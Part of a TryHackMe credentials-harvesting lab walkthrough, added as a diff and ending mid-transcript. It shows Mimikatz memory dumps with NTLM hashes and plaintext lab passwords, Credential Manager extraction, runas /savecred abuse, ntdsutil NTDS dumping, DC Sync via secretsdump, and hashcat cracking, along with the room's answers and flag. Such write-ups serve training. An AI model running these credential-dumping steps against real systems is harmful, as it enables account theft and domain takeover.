@@ -693,3 +693,698 @@ SID               : S-1-5-96-0-1
          * Username : CREDS-HARVESTIN$
          * Domain   : THM
          * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
+         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
+        tspkg :
+        wdigest :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * Password : (null)
+        kerberos :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : thm.red
+         * Password : f7 1d 0d 25 f8 8d 5c da aa b8 6e aa de 49 67 ed 55 8c aa 07 b8 b9 31 45 71 42 7f 33 88 b1 7f 46 32 2f 09 7a ed 3e 2d 9f 3e ef 08 32 2d af d6 22 fb c6 82 01 9e 0c 23 e0 cf 4d 76 90 a0 33 77 8d 24 da 8f 32 79 8c 4b 6f a7 da f2 bd aa cc df e0 84 f2 6a a7 c7 92 3c 8a 8a b8 6d df 33 44 2e d6 db 7f 24 0e 37 3d 46 7e 42 66 a1 d1 26 a3 0a 6f e2 22 e3 22 c5 7d 8b 5e 5c 68 51 dc 65 a6 67 7c fb fd ea 6e 7b cd 94 3f a6 44 21 36 ab a7 c2 ba 67 dd 56 e9 ec 89 e6 3a c5 39 2c f7 70 4e 5f 59 83 e6 17 4b 1b f2 ad a8 5a 33 09 93 81 ee 4f 5e 60 28 72 8a 5b 4a 97 8c 9d eb 2a 9e a4 7a 89 7c e7 6f ea 1c 20 da ea 85 f8 ea 11 f3 24 ab 1c 7e 75 ee a2 a4 98 7d 61 d2 b2 f3 af 31 ae a9 b3 4e c2 8c a7 37 26 30 f2 0f c1 9d 77 1f 54 82 eb 7e
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 781648 (00000000:000bed50)
+Session           : RemoteInteractive from 2
+User Name         : thm
+Domain            : THM
+Logon Server      : CREDS-HARVESTIN
+Logon Time        : 9/26/2022 4:16:33 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1114
+        msv :
+         [00000003] Primary
+         * Username : thm
+         * Domain   : THM
+         * NTLM     : fc525c9683e8fe067095ba2ddc971889
+         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
+         * DPAPI    : cd09e2e4f70ef660400b8358c52a46b8
+        tspkg :
+        wdigest :
+         * Username : thm
+         * Domain   : THM
+         * Password : (null)
+        kerberos :
+         * Username : thm
+         * Domain   : THM.RED
+         * Password : (null)
+        ssp :
+        credman :
+         [00000000]
+         * Username : thm
+         * Domain   : 10.10.237.226
+         * Password : jfxKruLkkxoPjwe3
+         [00000001]
+         * Username : thm.red\thm-local
+         * Domain   : thm.red\thm-local
+         * Password : Passw0rd123
+
+Authentication Id : 0 ; 781445 (00000000:000bec85)
+Session           : RemoteInteractive from 2
+User Name         : thm
+Domain            : THM
+Logon Server      : CREDS-HARVESTIN
+Logon Time        : 9/26/2022 4:16:33 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1114
+        msv :
+         [00000003] Primary
+         * Username : thm
+         * Domain   : THM
+         * NTLM     : fc525c9683e8fe067095ba2ddc971889
+         * SHA1     : e53d7244aa8727f5789b01d8959141960aad5d22
+         * DPAPI    : cd09e2e4f70ef660400b8358c52a46b8
+        tspkg :
+        wdigest :
+         * Username : thm
+         * Domain   : THM
+         * Password : (null)
+        kerberos :
+         * Username : thm
+         * Domain   : THM.RED
+         * Password : (null)
+        ssp :
+        credman :
+         [00000000]
+         * Username : thm
+         * Domain   : 10.10.237.226
+         * Password : jfxKruLkkxoPjwe3
+         [00000001]
+         * Username : thm.red\thm-local
+         * Domain   : thm.red\thm-local
+         * Password : Passw0rd123
+
+Authentication Id : 0 ; 745669 (00000000:000b60c5)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:16:29 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
+         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
+        tspkg :
+        wdigest :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * Password : (null)
+        kerberos :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : thm.red
+         * Password : f7 1d 0d 25 f8 8d 5c da aa b8 6e aa de 49 67 ed 55 8c aa 07 b8 b9 31 45 71 42 7f 33 88 b1 7f 46 32 2f 09 7a ed 3e 2d 9f 3e ef 08 32 2d af d6 22 fb c6 82 01 9e 0c 23 e0 cf 4d 76 90 a0 33 77 8d 24 da 8f 32 79 8c 4b 6f a7 da f2 bd aa cc df e0 84 f2 6a a7 c7 92 3c 8a 8a b8 6d df 33 44 2e d6 db 7f 24 0e 37 3d 46 7e 42 66 a1 d1 26 a3 0a 6f e2 22 e3 22 c5 7d 8b 5e 5c 68 51 dc 65 a6 67 7c fb fd ea 6e 7b cd 94 3f a6 44 21 36 ab a7 c2 ba 67 dd 56 e9 ec 89 e6 3a c5 39 2c f7 70 4e 5f 59 83 e6 17 4b 1b f2 ad a8 5a 33 09 93 81 ee 4f 5e 60 28 72 8a 5b 4a 97 8c 9d eb 2a 9e a4 7a 89 7c e7 6f ea 1c 20 da ea 85 f8 ea 11 f3 24 ab 1c 7e 75 ee a2 a4 98 7d 61 d2 b2 f3 af 31 ae a9 b3 4e c2 8c a7 37 26 30 f2 0f c1 9d 77 1f 54 82 eb 7e
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:15:24 PM
+SID               : S-1-5-17
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:15:01 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 63658 (00000000:0000f8aa)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:15:01 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
+         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
+        tspkg :
+        wdigest :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * Password : (null)
+        kerberos :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : thm.red
+         * Password : f7 1d 0d 25 f8 8d 5c da aa b8 6e aa de 49 67 ed 55 8c aa 07 b8 b9 31 45 71 42 7f 33 88 b1 7f 46 32 2f 09 7a ed 3e 2d 9f 3e ef 08 32 2d af d6 22 fb c6 82 01 9e 0c 23 e0 cf 4d 76 90 a0 33 77 8d 24 da 8f 32 79 8c 4b 6f a7 da f2 bd aa cc df e0 84 f2 6a a7 c7 92 3c 8a 8a b8 6d df 33 44 2e d6 db 7f 24 0e 37 3d 46 7e 42 66 a1 d1 26 a3 0a 6f e2 22 e3 22 c5 7d 8b 5e 5c 68 51 dc 65 a6 67 7c fb fd ea 6e 7b cd 94 3f a6 44 21 36 ab a7 c2 ba 67 dd 56 e9 ec 89 e6 3a c5 39 2c f7 70 4e 5f 59 83 e6 17 4b 1b f2 ad a8 5a 33 09 93 81 ee 4f 5e 60 28 72 8a 5b 4a 97 8c 9d eb 2a 9e a4 7a 89 7c e7 6f ea 1c 20 da ea 85 f8 ea 11 f3 24 ab 1c 7e 75 ee a2 a4 98 7d 61 d2 b2 f3 af 31 ae a9 b3 4e c2 8c a7 37 26 30 f2 0f c1 9d 77 1f 54 82 eb 7e
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 34424 (00000000:00008678)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:58 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
+         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
+        tspkg :
+        wdigest :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * Password : (null)
+        kerberos :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : thm.red
+         * Password : f7 1d 0d 25 f8 8d 5c da aa b8 6e aa de 49 67 ed 55 8c aa 07 b8 b9 31 45 71 42 7f 33 88 b1 7f 46 32 2f 09 7a ed 3e 2d 9f 3e ef 08 32 2d af d6 22 fb c6 82 01 9e 0c 23 e0 cf 4d 76 90 a0 33 77 8d 24 da 8f 32 79 8c 4b 6f a7 da f2 bd aa cc df e0 84 f2 6a a7 c7 92 3c 8a 8a b8 6d df 33 44 2e d6 db 7f 24 0e 37 3d 46 7e 42 66 a1 d1 26 a3 0a 6f e2 22 e3 22 c5 7d 8b 5e 5c 68 51 dc 65 a6 67 7c fb fd ea 6e 7b cd 94 3f a6 44 21 36 ab a7 c2 ba 67 dd 56 e9 ec 89 e6 3a c5 39 2c f7 70 4e 5f 59 83 e6 17 4b 1b f2 ad a8 5a 33 09 93 81 ee 4f 5e 60 28 72 8a 5b 4a 97 8c 9d eb 2a 9e a4 7a 89 7c e7 6f ea 1c 20 da ea 85 f8 ea 11 f3 24 ab 1c 7e 75 ee a2 a4 98 7d 61 d2 b2 f3 af 31 ae a9 b3 4e c2 8c a7 37 26 30 f2 0f c1 9d 77 1f 54 82 eb 7e
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 31587 (00000000:00007b63)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:48 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * NTLM     : 9ea464f05e82b101c9d9a4736d5da673
+         * SHA1     : b61cc76a7014cca1f31cc9d7c4d8190a76095e3e
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : CREDS-HARVESTIN$
+Domain            : THM
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:48 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : CREDS-HARVESTIN$
+         * Domain   : THM
+         * Password : (null)
+        kerberos :
+         * Username : creds-harvestin$
+         * Domain   : THM.RED
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz #
+```
+If yes, try removing the protection and dumping the memory using Mimikatz. Once you have done, hit Complete.
+### Windows Credential Manager
+This task introduces the Windows Credential Manager and discusses the technique used for dumping system credentials by exploiting it.
+What is Credentials Manager?
+Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:
+Web credentials contain authentication details stored in Internet browsers or other applications.
+Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
+Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
+Certificate-based credentials: Athunticated details based on certifications.
+Note that authentication details are stored on the user's folder and are not shared among Windows user accounts. However, they are cached in memory.
+Accessing Credential Manager
+We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.
+We will be using the Microsoft Credentials Manager vaultcmd utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target.
+```text
+Listing the Available Credentials from the Credentials Manager
+
+           
+C:\Users\Administrator>vaultcmd /list
+Currently loaded vaults:
+        Vault: Web Credentials
+        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+        Vault: Windows Credentials
+        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
+        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
+```
+By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.
+Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with /listproperties.
+```text
+Checking if there Are any Stored Credentials in the "Web Credentials."
+
+           
+C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
+Vault Properties: Web Credentials
+Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+Number of credentials: 1
+Current protection method: DPAPI
+```
+The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,
+```text
+Listing Credentials Details for "Web Credentials"
+
+           
+C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
+Credentials in vault: Web Credentials
+
+Credential schema: Windows Web Password Credential
+Resource: internal-app.thm.red
+Identity: THMUser Saved By: MSEdge
+Hidden: No
+Roaming: Yes
+```
+Credential Dumping
+The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1, which is already included in the attached VM.
+Ensure to execute PowerShell with bypass policy to import it as a module as follows,
+```text
+Getting Clean-text Password from Web Credentials
+
+           
+C:\Users\Administrator>powershell -ex bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
+PS C:\Users\Administrator> Get-WebCredentials
+
+UserName  Resource             Password     Properties
+--------  --------             --------     ----------
+THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
+```
+The output shows that we obtained the username and password for accessing the internal application.
+RunAs
+An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The /savecred argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.
+Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using cmdkey, which is a tool to create, delete, and display stored Windows credentials. By providing the /list argument, we can show all stored credentials, or we can specify the credential to display more details /list:computername.
+```text
+Enumerating for Stored Windows Credentials
+
+           
+C:\Users\thm>cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=thm\thm-local
+    Type: Domain Password
+    User: thm\thm-local
+```
+The output shows that we have a domain password stored as the thm\thm-local user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the thm-local user.
+```text
+Run CMD.exe As a User with the /savecred argument
+
+           
+C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
+Attempting to start cmd.exe as user "THM.red\thm-local" ...
+```
+A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the c:\Users\thm-local\Saved Games\flag.txt, try to read it and answer the question below.
+Mimikatz
+Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.
+```text
+Dumping Memory for Credentials Manager
+
+           
+C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::credman
+```
+Apply this technique to the attached machine and answer the question below.
+The techniques discussed in this task also could be done through other tools such as Empire, Metasploit, etc. You can do your own research to expand your knowledge.
+```text
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>powershell -ex bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> Import-Module C:\Tools\Get-WebCredentials.ps1
+PS C:\Windows\system32> Get-WebCredentials
+
+UserName Resource             Password     Properties
+-------- --------             --------     ----------
+THMuser  internal-app.thm.red E4syPassw0rd {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], ...
+```
+Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?
+Using THM user access, check the Web Credentials.
+*E4syPassw0rd*
+```text
+mimikatz # sekurlsa::credman
+
+Authentication Id : 0 ; 746421 (00000000:000b63b5)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:16:30 PM
+SID               : S-1-5-90-0-2
+        credman :
+
+Authentication Id : 0 ; 744851 (00000000:000b5d93)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:16:29 PM
+SID               : S-1-5-96-0-2
+        credman :
+
+Authentication Id : 0 ; 744759 (00000000:000b5d37)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:16:29 PM
+SID               : S-1-5-96-0-2
+        credman :
+
+Authentication Id : 0 ; 63677 (00000000:0000f8bd)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:15:01 PM
+SID               : S-1-5-90-0-1
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : CREDS-HARVESTIN$
+Domain            : THM
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:59 PM
+SID               : S-1-5-20
+        credman :
+
+Authentication Id : 0 ; 34485 (00000000:000086b5)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:58 PM
+SID               : S-1-5-96-0-1
+        credman :
+
+Authentication Id : 0 ; 34455 (00000000:00008697)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:58 PM
+SID               : S-1-5-96-0-0
+        credman :
+
+Authentication Id : 0 ; 34445 (00000000:0000868d)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:58 PM
+SID               : S-1-5-96-0-1
+        credman :
+
+Authentication Id : 0 ; 781648 (00000000:000bed50)
+Session           : RemoteInteractive from 2
+User Name         : thm
+Domain            : THM
+Logon Server      : CREDS-HARVESTIN
+Logon Time        : 9/26/2022 4:16:33 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1114
+        credman :
+         [00000000]
+         * Username : thm
+         * Domain   : 10.10.237.226
+         * Password : jfxKruLkkxoPjwe3
+         [00000001]
+         * Username : thm.red\thm-local
+         * Domain   : thm.red\thm-local
+         * Password : Passw0rd123
+
+Authentication Id : 0 ; 781445 (00000000:000bec85)
+Session           : RemoteInteractive from 2
+User Name         : thm
+Domain            : THM
+Logon Server      : CREDS-HARVESTIN
+Logon Time        : 9/26/2022 4:16:33 PM
+SID               : S-1-5-21-1966530601-3185510712-10604624-1114
+        credman :
+         [00000000]
+         * Username : thm
+         * Domain   : 10.10.237.226
+         * Password : jfxKruLkkxoPjwe3
+         [00000001]
+         * Username : thm.red\thm-local
+         * Domain   : thm.red\thm-local
+         * Password : Passw0rd123
+
+Authentication Id : 0 ; 745669 (00000000:000b60c5)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:16:29 PM
+SID               : S-1-5-90-0-2
+        credman :
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:15:24 PM
+SID               : S-1-5-17
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:15:01 PM
+SID               : S-1-5-19
+        credman :
+
+Authentication Id : 0 ; 63658 (00000000:0000f8aa)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:15:01 PM
+SID               : S-1-5-90-0-1
+        credman :
+
+Authentication Id : 0 ; 34424 (00000000:00008678)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:58 PM
+SID               : S-1-5-96-0-0
+        credman :
+
+Authentication Id : 0 ; 31587 (00000000:00007b63)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:48 PM
+SID               :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : CREDS-HARVESTIN$
+Domain            : THM
+Logon Server      : (null)
+Logon Time        : 9/26/2022 4:14:48 PM
+SID               : S-1-5-18
+        credman :
+```
+Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?
+Remember to run Mimikatz as System Administrator!
+*jfxKruLkkxoPjwe3*
+Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?
+```text
+PS C:\Windows\system32> cmdkey /list
+
+Currently stored credentials:
+
+    Target: LegacyGeneric:target=10.10.237.226
+    Type: Generic
+    User: thm
+
+    Target: Domain:interactive=thm.red\thm-local
+    Type: Domain Password
+    User: thm.red\thm-local
+
+PS C:\Windows\system32> runas /savecred /user:THM.red\thm-local cmd.exe
+Attempting to start cmd.exe as user "THM.red\thm-local" ...
+
+is opened another window cmd
+
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+thm\thm-local
+
+C:\Windows\system32>more c:\Users\thm-local\Saved Games\flag.txt
+Cannot access file C:\Users\thm-local\Saved
+
+C:\Windows\system32>more "c:\Users\thm-local\Saved Games\flag.txt"
+THM{RunA5S4veCr3ds}
+
+C:\Windows\system32>
+```
+### Domain Controller
+This task discusses the required steps to dump Domain Controller Hashes locally and remotely.
+NTDS Domain Controller
+New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:
+Schema table: it contains types of objects and their relationships.
+Link table: it contains the object's attributes and their values.
+Data type: It contains users and groups.
+NTDS is located in C:\Windows\NTDS by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. However, there are various ways to gain access to it. This task will discuss how to get a copy of the NTDS file using the ntdsutil and Diskshadow tool and finally how to dump the file's content. It is important to note that decrypting the NTDS file requires a system Boot Key to attempt to decrypt LSA Isolated credentials, which is stored in the SECURITY file system. Therefore, we must also dump the security file containing all required files to decrypt.
+Ntdsutil
+Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios such as
+Restore deleted objects in Active Directory.
+Perform maintenance for the AD database.
+Active Directory snapshot management.
+Set Directory Services Restore Mode (DSRM) administrator passwords.
+For more information about Ntdsutil, you may visit the Microsoft documentation page.
+Local Dumping (No Credentials)
+This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller.
+To successfully dump the content of the NTDS file we need the following files:
+C:\Windows\NTDS\ntds.dit
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\config\SECURITY
+The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the C:\temp directory.
+```text
+Dumping the content of the NTDS file from the Victim Machine
+
+           
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+```
+Now, if we check the c:\temp directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.
+```text
+Extract hashes from NTDS Locally
+
+           
+user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
+```
+Remote Dumping (With Credentials)
+In the previous section, we discussed how to get hashes from memory with no credentials in hand. In this task, we will be showing how to dump a system and domain controller hashes remotely, which requires credentials, such as passwords or NTLM hashes. We also need credentials for users with administrative access to a domain controller or special permissions as discussed in the DC Sync section.
+DC Sync
+The DC Sync is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:
+Replicating Directory Changes
+Replicating Directory Changes All
+Replicating Directory Changes in Filtered Set
+An adversary takes advantage of these configurations to perform domain replication, commonly referred to as "DC Sync", or Domain Controller Sync. For more information about the DC Sync attack, you can visit the THM Persisting AD room (Task 2).
+The Persisting AD room uses the Mimikatz tool to perform the DC Synchronisation attack. Let's demonstrate the attack using a different tool, such as the Impacket SecretsDump script.
+```text
+Performing the DC Sync Attack
+
+           
+user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.53.63 
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
+```
+Let's explain the command a bit more.
+the -just-dc argument is for extracting the NTDS data.
+the thm.red/AD_Admin_User is the authenticated domain user in the form of (domain/user).
+Note if we are interested to dump only the NTLM hashes, then we can use the -just-dc-ntlm argument as follows,
+```text
+The DC Sync Attack to Dump NTLM Hashes
+
+           
+user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.53.63
+```
+Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such hashcat. We can use the hashcat -m 1000 mode to crack the Windows NTLM hashes as follows:
+
+## Exploitation
+```text
+Performing the DC Sync Attack
+
+           
+user@machine$ hashcat -m 1000 -a 0  /path/to/wordlist/such/as/rockyou.txt
+```
+```text
+PS C:\Windows\system32> powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+C:\Windows\system32\ntdsutil.exe: ac i ntds
+Active instance set to "ntds".
+C:\Windows\system32\ntdsutil.exe: ifm
+ifm: create full c:\temp
+Creating snapshot...
+Snapshot set {85d6ff5d-2eb7-4d04-a6cc-a9c7dc68fb66} generated successfully.
+Snapshot {aa1dfdec-d81e-4bb1-aa5c-b4f60b556a15} mounted as C:\$SNAP_202209261716_VOLUMEC$\
+Snapshot {aa1dfdec-d81e-4bb1-aa5c-b4f60b556a15} is already mounted.
+Initiating DEFRAGMENTATION mode...
+     Source Database: C:\$SNAP_202209261716_VOLUMEC$\Windows\NTDS\ntds.dit
+     Target Database: c:\temp\Active Directory\ntds.dit
+
+                  Defragmentation  Status (omplete)
+
+          0    10   20   30   40   50   60   70   80   90  100
+          |----|----|----|----|----|----|----|----|----|----|
+          ...................................................
+
+Copying registry files...
+Copying c:\temp\registry\SYSTEM
+Copying c:\temp\registry\SECURITY
+Snapshot {aa1dfdec-d81e-4bb1-aa5c-b4f60b556a15} unmounted.
+IFM media created successfully in c:\temp
+ifm: q
+C:\Windows\system32\ntdsutil.exe: q
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/share]
+└─$ ls
+sam.hive  system.hive
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/share]
+└─$ cd ..
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
